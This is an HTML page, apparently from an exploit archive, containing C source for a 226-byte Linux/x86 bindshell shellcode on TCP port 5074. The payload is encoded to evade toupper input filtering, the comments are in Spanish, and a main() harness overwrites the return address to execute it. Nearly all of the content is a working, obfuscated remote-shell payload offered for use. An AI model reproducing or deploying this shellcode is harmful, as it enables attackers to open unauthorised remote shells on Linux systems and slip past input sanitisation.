<html><head><title>Linux/x86 - Bindshell TCP/5074 - 226 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Bindshell puerto 5074 (TOUPPER EVASION)
 * 226 bytes
 * Bindshell original: Matias Sedalo (92 bytes)
 *
 * La binshell esta codificada usando 2 bytes para
 * representar 1 byte original de la siguiente forma:
 * byte original: 0xAB
 * 0x41 + 0xA = 0x4B; 0x41 + 0xB = 0x4C
 * byte codificado: [0x4B 0x4C]
 *
 * by Tora
 */

#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

char shellcode[] = 
/* _start */
&quot;\xeb\x02&quot;			/* jmp short A          */

/* A */
&quot;\xeb\x05&quot;			/* jmp short C          */

/* B */
&quot;\xe8\xf9\xff\xff\xff&quot;		/* call A               */

/* C */
&quot;\x5f&quot;				/* pop edi              */
&quot;\x81\xef\xdf\xff\xff\xff&quot;	/* sub edi, 0xffffffdf  */
&quot;\x57&quot;				/* push edi             */
&quot;\x5e&quot;				/* pop esi              */
&quot;\x29\xc9&quot;			/* sub ecx, ecx         */
&quot;\x80\xc1\xb8&quot;			/* add cl, 0xb8         */

/* bucle */
&quot;\x8a\x07&quot;			/* mov al, byte [edi]   */
&quot;\x2c\x41&quot;			/* sub al, 0x41         */
&quot;\xc0\xe0\x04&quot;			/* shl al, 4            */
&quot;\x47&quot;				/* inc edi              */
&quot;\x02\x07&quot;			/* add al, byte [edi]   */
&quot;\x2c\x41&quot;			/* sub al, 0x41         */
&quot;\x88\x06&quot;			/* mov byte [esi], al   */
&quot;\x46&quot;				/* inc esi              */
&quot;\x47&quot;				/* inc edi              */
&quot;\x49&quot;				/* dec ecx              */
&quot;\xe2\xed&quot;			/* loop bucle           */
/* Shellcode codificada de 184 (0xb8) bytes */
&quot;DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB&quot;
&quot;AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA&quot;
&quot;JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO&quot;
&quot;BLAALMNIA&quot;;

int main(void)
{
    int *ret;
    char *t;

    for (t = shellcode; *t; t++)
        if (islower(*t))
            *t = toupper(*t);
	
    ret=(int *)&amp;ret +3;
    printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
    (*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
